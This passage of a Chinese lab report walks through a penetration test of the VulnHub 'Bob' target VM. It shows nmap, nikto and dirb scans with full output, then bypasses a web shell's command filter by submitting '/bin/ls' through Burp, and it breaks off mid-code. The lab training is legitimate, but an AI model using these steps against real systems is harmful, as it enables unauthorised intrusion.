+<li><strong>实验结果分析</strong>：对实验结果进行了分析，与理论预期进行了比较，得出了有意义的结论。</li>
+<li><strong>实验意义</strong>：实验不仅提升了技术能力，更重要的是提高了安全意识，对于未来的软件开发和安全防护工作具有重要意义。</li>
+</ul>
+<h2><span id="实训2-项目名称-bob渗透测试">实训2 项目名称：   Bob渗透测试</span></h2><h4><span id="一-环境及工具">一、环境及工具</span></h4><h5><span id="环境">环境</span></h5><ul>
+<li><strong>操作系统</strong>：Kali Linux</li>
+<li><strong>测试网络</strong>：安全隔离的内部网络，确保实验不影响外部网络</li>
+<li><p><strong>目标主机</strong>：模拟的受害者计算机（称为Bob）</p>
+<ul>
+<li>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com/</a><br>靶机名称：bob-101，下载ova格式文件，直接在虚拟机打开，网络适配器中设置为NAT模式网卡即可。</li>
+</ul>
+</li>
+<li><p><strong>前置知识</strong>：网络安全基础，Linux操作系统，渗透测试方法</p>
+</li>
+<li><strong>必要的课程/说明</strong>：网络安全概念，渗透测试原理</li>
+<li><strong>推荐文章链接</strong>：<ol>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/220143826">Nmap使用详解</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/124246499">Nikto工具使用教程</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44912169/article/details/105655195">Dirb使用教程</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nmap/p/6148306.html">NC工具使用方法</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/220143826">https://zhuanlan.zhihu.com/p/220143826</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fq4y1H7no?from=search&amp;seid=15707938581315721996&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1fq4y1H7no?from=search&amp;seid=15707938581315721996&amp;spm_id_from=333.337.0.0</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/z2560088/article/details/120397193">https://blog.csdn.net/z2560088/article/details/120397193</a></li>
+</ol>
+</li>
+</ul>
+<h5><span id="工具">工具</span></h5><ol>
+<li><strong>Nmap</strong>：用于主机发现和端口扫描</li>
+<li><strong>Nikto</strong>：用于网站漏洞扫描</li>
+<li><strong>Dirb</strong>：用于敏感文件和目录的探索</li>
+<li><strong>Burp Suite</strong>：用于Web应用的安全测试</li>
+<li><strong>Netcat（NC）</strong>：用于网络操作，如端口监听和Shell连接</li>
+</ol>
+<h5><span id="实验概述">实验概述</span></h5><p><strong>目的</strong>：通过对目标主机Bob的渗透测试，理解和掌握基本的网络安全渗透方法。</p>
+<p><strong>要求</strong>：</p>
+<ul>
+<li>完成对目标主机的信息收集</li>
+<li>执行渗透测试</li>
+<li>获取目标主机控制权</li>
+<li>进行后续的深度渗透和数据分析</li>
+</ul>
+<p><strong>原理</strong>：使用渗透测试工具进行目标主机的漏洞扫描、利用发现的漏洞获取目标主机的控制权，从而理解攻击者可能利用的方法和手段。</p>
+<h5><span id="准备工作">准备工作</span></h5><p>靶场</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bob-101,226/">Bob: 1.0.1 ~ VulnHub</a> </p>
+<p>攻击工具<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&amp;spm=1001.2101.3001.7020">kali</a>虚拟机</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://img-blog.csdnimg.cn/20210920235631222.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img" class="lazyload"></p>
+<p> <img data-fancybox="gallery" data-sizes="auto" data-src="https://img-blog.csdnimg.cn/20210920235735486.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img" class="lazyload"></p>
+<p> 直接双击打开即可添加到虚拟机。打开后网卡使用NAT模式。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://img-blog.csdnimg.cn/20210921000718269.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img" class="lazyload"></p>
+<p>没有给用户名和密码。（给了就没有攻击的必要了 hhh）</p>
+<h4><span id="二-实训流程及分析">二、实训流程及分析</span></h4><h5><span id="1-信息收集">1. 信息收集</span></h5><ul>
+<li><strong>操作</strong>：使用Nmap进行目标主机发现和端口扫描。</li>
+<li><strong>目的</strong>：确定目标主机在网络上的存在，并识别开放的端口和服务。</li>
+<li><strong>分析</strong>：通过扫描结果，获取目标主机的网络结构和潜在漏洞点。</li>
+</ul>
+<h5><span id="2-网站信息收集">2. 网站信息收集</span></h5><ul>
+<li><strong>操作</strong>：使用Nikto扫描目标网站。</li>
+<li><strong>目的</strong>：寻找网站潜在的安全漏洞和敏感信息。</li>
+<li><strong>分析</strong>：识别出的漏洞为后续的渗透提供了切入点。</li>
+</ul>
+<h5><span id="3-敏感文件扫描">3. 敏感文件扫描</span></h5><ul>
+<li><strong>操作</strong>：用Dirb工具进行网页敏感文件扫描。</li>
+<li><strong>目的</strong>：探索和识别隐藏的、未经授权的文件和目录。</li>
+<li><strong>分析</strong>：发现的敏感文件可能包含有用的信息，为进一步的渗透提供帮助。</li>
+</ul>
+<h5><span id="4-渗透测试">4. 渗透测试</span></h5><ul>
+<li><strong>操作</strong>：通过Webshell在浏览器中执行命令。</li>
+<li><strong>目的</strong>：验证网站的安全性和执行服务器命令的能力。</li>
+<li><strong>分析</strong>：执行的命令和反馈结果帮助了解目标系统的内部结构。</li>
+</ul>
+<h5><span id="5-抓包分析">5. 抓包分析</span></h5><ul>
+<li><strong>操作</strong>：使用Burp Suite捕捉和分析网络流量。</li>
+<li><strong>目的</strong>：观察数据传输过程，寻找可能的安全漏洞。</li>
+<li><strong>分析</strong>：捕获的数据包揭示了Web应用的通信细节和潜在的安全问题。</li>
+</ul>
+<h5><span id="6-获取shell控制权">6. 获取Shell控制权</span></h5><ul>
+<li><strong>操作</strong>：通过Netcat在Kali上监听端口，然后通过Burp Suite发起Shell链接。</li>
+<li><strong>目的</strong>：获得目标主机的控制权。</li>
+<li><strong>分析</strong>：成功连接到Shell意味着可以远程控制目标主机。</li>
+</ul>
+<h5><span id="7-具体细节">7. 具体细节</span></h5><img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104101540865.png" class title="image-20240104101540865">
+<p><strong>本地信息收集</strong><br>打开kali（集成了大量渗透工具）。<br>使用nmap扫描神器探测本网段存活主机IP，从而确定靶机IP地址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[~]<br>└─# ifconfig<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.233.135  netmask 255.255.255.0  broadcast 192.168.233.255<br>        inet6 fe80::20c:29ff:fe98:3ed0  prefixlen 64  scopeid 0x20&lt;link&gt;<br>        ether 00:0c:29:98:3e:d0  txqueuelen 1000  (Ethernet)<br>        RX packets 3959  bytes 3668336 (3.4 MiB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 2113  bytes 305050 (297.9 KiB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen 1000  (Local Loopback)<br>        RX packets 448  bytes 36416 (35.5 KiB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 448  bytes 36416 (35.5 KiB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105100943.png" class title="image-20240104105100943">
+<p><code>192.168.233.135</code>kali IP段</p>
+<p><code>nmap -sP 192.168.233.0/24</code></p>
+<p>查看kali本机IP<br>全面探测端口并将结果导出至<code>nmap.A</code>，全面扫描是因为有些服务会被改端口号，而我们会用到这些端口号，可以看到ssh端口被改。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># nmap -sP 192.168.233.0/24</span><br>Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-04 10:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.233.1<br>Host is up (0.00021s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.233.2<br>Host is up (0.00011s latency).<br>MAC Address: 00:50:56:EA:3E:CA (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.233.138<br>Host is up (0.000075s latency).<br>MAC Address: 00:0C:29:E8:1C:09 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.233.254<br>Host is up (0.00037s latency).<br>MAC Address: 00:50:56:F7:F3:DD (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.233.135<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.10 seconds<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105348461.png" class title="image-20240104105348461">
+<p>bob地址</p>
+<blockquote>
+<p><code>192.168.233.138</code></p>
+</blockquote>
+<p>nmap -A  192.168.233.138 -p- -oN nmap192.168.233.138</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[~]<br>└─# nmap -A  192.168.233.138 -p- -oN nmap192.168.233.138<br>Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-04 10:58 CST<br>Nmap scan report for 192.168.233.138<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.25 ((Debian))<br>| http-robots.txt: 4 disallowed entries <br>| /login.php /dev_shell.php /lat_memo.html <br>|_/passwords.html<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>|_http-server-header: Apache/2.4.25 (Debian)<br>25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 84f2f8e5ed3e14f393d41e4c413ba2a9 (RSA)<br>|   256 5b98c74f846efd566a351683aa9ceaf8 (ECDSA)<br>|_  256 391656fb4e0f508540d3532241433815 (ED25519)<br>MAC Address: 00:0C:29:E8:1C:09 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   1.30 ms 192.168.233.138<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds<br></code></pre></td></tr></table></figure>
+<p>收集到靶机开启了http和ssh服务及其对应的端口号和版本。<br><img data-fancybox="gallery" data-sizes="auto" data-src="https://img-blog.csdnimg.cn/88273c8bd8574284b500608dd88d3c39.png" alt="在这里插入图片描述" class="lazyload"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.233.138/">192.168.233.138</a></p>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104110302654.png" class title="image-20240104110302654">
+</blockquote>
+<p>经验：多点点多看看，挖掘有用信息，通过浏览网站页面，我们推测Bob J可能是管理员。<br><img data-fancybox="gallery" data-sizes="auto" data-src="https://img-blog.csdnimg.cn/ca353b6520cc4aac92ab4efecbff6865.png" alt="在这里插入图片描述" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://img-blog.csdnimg.cn/a170dfe4c21442a4a16ddbc44c58bb20.png" alt="在这里插入图片描述" class="lazyload"><br>使用nikto工具扫描网站后台信息，其中Robots.txt代表反爬虫机制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nikto -h http://192.168.233.138<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104111710582.png" class title="image-20240104111710582">
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[~]<br>└─# nikto -h http://192.168.233.138<br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.233.138<br>+ Target Hostname:    192.168.233.138<br>+ Target Port:        80<br>+ Start Time:         2024-01-04 11:16:47 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.25 (Debian)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)<br>+ /robots.txt: Entry &#x27;/dev_shell.php&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file<br>+ /robots.txt: Entry &#x27;/lat_memo.html&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file<br>+ /robots.txt: Entry &#x27;/passwords.html&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file<br>+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.<br>+ /: Server may leak inodes via ETags, header found with file /, inode: 591, size: 5669af30ee8f1, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418<br>+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .<br></code></pre></td></tr></table></figure>
+<p>这是一次使用Nikto工具对名为”Bob”的靶机（IP地址192.168.233.138）进行的网络安全扫描报告。Nikto是一种流行的开源网络安全扫描工具，用于检测网站的潜在漏洞。以下是对扫描结果的解释和分析：</p>
+<ol>
+<li><p><strong>目标信息</strong>:</p>
+<ul>
+<li>IP地址: 192.168.233.138</li>
+<li>主机名: 192.168.233.138</li>
+<li>目标端口: 80（通常用于HTTP服务）</li>
+<li>扫描时间: 2024年1月4日 11:16:47（GMT+8）</li>
+</ul>
+</li>
+<li><p><strong>发现的问题和潜在漏洞</strong>:</p>
+<ul>
+<li><strong>Web服务器版本</strong>: 使用的是Apache/2.4.25 (Debian)，该版本可能已过时，因为最新的Apache版本至少是2.4.54。使用过时的软件版本可能会暴露已知的安全漏洞。</li>
+<li><strong>X-Frame-Options未设置</strong>: 此HTTP响应头用于防止点击劫持攻击。未设置此头可能使网站容易受到此类攻击。</li>
+<li><strong>缺少X-Content-Type-Options</strong>: 未设置此头可能允许浏览器以与MIME类型不同的方式解释网站内容，可能导致安全问题。</li>
+<li><strong>robots.txt文件的内容</strong>: 发现’/dev_shell.php’、’/lat_memo.html’和’/passwords.html’路径在robots.txt文件中，但可以访问。这可能意味着这些路径包含敏感信息或功能，但未被适当保护。</li>
+<li><strong>ETags信息泄露</strong>: 服务器配置可能会泄漏inode信息，这可以被用来执行一些特定的攻击，如inode枚举。</li>
+<li><strong>允许的HTTP方法</strong>: 发现服务器允许OPTIONS, HEAD, GET, POST方法。额外的方法，特别是OPTIONS，可能会暴露过多的信息给潜在的攻击者。</li>
+</ul>
+</li>
+<li><p><strong>攻击和防御策略</strong>:</p>
+<ul>
+<li><strong>更新Apache服务器</strong>: 应该更新到最新版本以修复已知的安全漏洞。</li>
+<li><strong>配置安全HTTP头</strong>: 应设置X-Frame-Options和X-Content-Type-Options头以增强安全性。</li>
+<li><strong>审核robots.txt文件</strong>: 检查robots.txt文件中提到的路径，确保不会公开敏感信息或功能。</li>
+<li><strong>限制HTTP方法</strong>: 考虑限制服务器上允许的HTTP方法，只允许必要的方法。</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dirb http://192.168.233.138<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">                                                                                                <br>┌──(root㉿kali)-[~]<br>└─# dirb http://192.168.233.138<br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Thu Jan  4 11:37:11 2024<br>URL_BASE: http://192.168.233.138/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.233.138/ ----<br>+ http://192.168.233.138/index.html (CODE:200|SIZE:1425)                                        <br>+ http://192.168.233.138/robots.txt (CODE:200|SIZE:111)                                         <br>+ http://192.168.233.138/server-status (CODE:403|SIZE:303)                                      <br>                                                                                                <br>-----------------<br>END_TIME: Thu Jan  4 11:37:14 2024<br>DOWNLOADED: 4612 - FOUND: 3<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113747750.png" class title="image-20240104113747750">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">User-agent: *<br>Disallow: /login.php<br>Disallow: /dev_shell.php<br>Disallow: /lat_memo.html<br>Disallow: /passwords.html<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113947574.png" class title="image-20240104113947574">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Really who made this file at least get a hash of your password to display, hackers can&#x27;t do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don&#x27;t make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. &gt;:(<br>-Bob<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114138182.png" class title="image-20240104114138182">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Memo sent at GMT+10:00 2:37:42 by User: Bob<br>Hey guys IT here don&#x27;t forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.<br><br>-Bob<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114223567.png" class title="image-20240104114223567">
+<p><code>uname -a</code></p>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114350590.png" class title="image-20240104114350590">
+<p>Output:</p>
+<p>Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux</p>
+<p><strong>BP爬虫</strong>：浏览网页文件，在dev.shell.php中发现有些命令无法使用，因此推测网站存在过滤机制，可能存在白名单。这时候需要用到抓包神器BP：burpsuite，通过抓包搜集有用信息。</p>
+<blockquote>
+<p>burpsuite</p>
+</blockquote>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114724876.png" class title="image-20240104114724876">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104134629831.png" class title="image-20240104134629831">
+<p>首先需要将本地端口号修改为其他服务不用的端口号，然后把网站流量引流到127.0.0.1的8888端口，需要安装插件foxyproxy，同时新增一项BP并开启foxyproxy。</p>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104135039398.png" class title="image-20240104135039398">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104140414325.png" class title="image-20240104140414325">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104162504862.png" class title="image-20240104162504862">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104142417794.png" class title="image-20240104142417794">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104164728109.png" class title="image-20240104164728109">
+<p>在dev.shell.php页面输入ls(之前不让访问的命令)，然后在BP中抓包，将抓到的包send to Repeater模块（重放模块），然后点击intercept is on，即关闭拦截抓包，这样dev.shell.php页面就能接收到先前输入的ls，对方网页也就不会发现异常了。之后点击repeater模块的send按钮，得到response。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /dev_shell.php HTTP/1.1<br><br>Host: 192.168.233.138<br><br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><br>Accept-Language: en-US,en;q=0.5<br><br>Accept-Encoding: gzip, deflate<br><br>Content-Type: application/x-www-form-urlencoded<br><br>Content-Length: 13<br><br>Origin: http://192.168.233.138<br><br>Connection: close<br><br>Referer: http://192.168.233.138/dev_shell.php<br><br>Upgrade-Insecure-Requests: 1<br><br><br><br>in_command=ls<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs shell">HTTP/1.1 200 OK<br><br>Date: Thu, 04 Jan 2024 06:26:16 GMT<br><br>Server: Apache/2.4.25 (Debian)<br><br>Vary: Accept-Encoding<br><br>Content-Length: 675<br><br>Connection: close<br><br>Content-Type: text/html; charset=UTF-8<br><br><br><br>&lt;html&gt;<br>&lt;body&gt;<br>    &lt;style&gt;<br>    #back&#123;<br>      position: fixed;<br>      top: 0;<br>      left: 0;<br>      min-width: 100%;<br>      min-height: 100%;<br>      z-index:-10<br>    &#125;<br>      #shell&#123;<br>        color: white;<br>        text-align: center;<br>    &#125;<br>  &lt;/style&gt;<br>  &lt;!-- WIP, don&#x27;t forget to report any bugs we don&#x27;t want another breach guys<br>  -Bob --&gt;<br>  &lt;div id=&quot;shell&quot;&gt;<br>    &lt;h2&gt;<br>      dev_shell<br>    &lt;/h2&gt;<br>    &lt;form action=&quot;dev_shell.php&quot; method=&quot;post&quot;&gt;<br>      Command: &lt;input type=&quot;text&quot; name=&quot;in_command&quot; /&gt; &lt;br&gt;<br>      &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;<br>    &lt;/form&gt;<br>    &lt;br&gt;<br>    &lt;h5&gt;Output:&lt;/h5&gt;<br>    Get out skid lol<br>  &lt;/div&gt;<br>    &lt;img src=&quot;dev_shell_back.png&quot; id=&quot;back&quot; alt=&quot;&quot;&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
+<p>尝试绕过网站安全机制，猜测网站使用了命令拦截，可以在response中看到黑名单（会拦截的命令）。ls在根下的bin目录中，因此尝试将<code>in_command</code>即输入的命令更改为<code>/bin/ls</code>（通过篡改命令潜入对方网站），此时可以看到web根目录下所有的网页内容，基于此，我们搜集有用内容（<code>php</code>页面包含信息更多，<code>.bak</code>后缀通常为备份文件）。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td 